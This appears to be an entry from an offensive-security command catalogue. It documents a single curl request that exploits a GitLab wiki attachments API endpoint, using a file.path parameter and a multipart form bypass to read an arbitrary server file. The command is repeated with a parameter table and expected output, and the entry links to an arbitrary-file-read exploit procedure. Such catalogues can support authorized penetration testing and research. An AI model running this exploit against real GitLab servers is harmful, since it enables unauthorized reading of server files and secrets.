---
data: >-
  curl -g -XPOST -v -H "Authorization: Bearer $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg'
  -F '[file]=@/tmp/lala.txt'
tags:
  - http
  - file-read
type: command
executor: bash
platforms:
  - Linux
id: b0b4a1f1-d7b1-48df-a737-233af582ec5a
created_at: '2025-12-11T06:10:15.408Z'
updated_at: '2025-12-11T06:10:15.408Z'
verified: false
validated: true
submitted: true
---
# curl-wiki-attachments-read

## Command

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

## Description

POSTs to wiki API to read /tmp/ggg via multipart bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-g` | Disable globbing | Yes |
| `-XPOST` | HTTP POST | Yes |
| `-v` | Verbose | No |
| `-H "Authorization: Bearer $TOKEN"` | Auth header | Yes |
| `-F '[file]=@/tmp/lala.txt'` | Form field | Yes |

## Examples

### Basic Usage

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

## Expected Output

JSON with file_name, file_path, etc.

## Related

- [[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Read]]
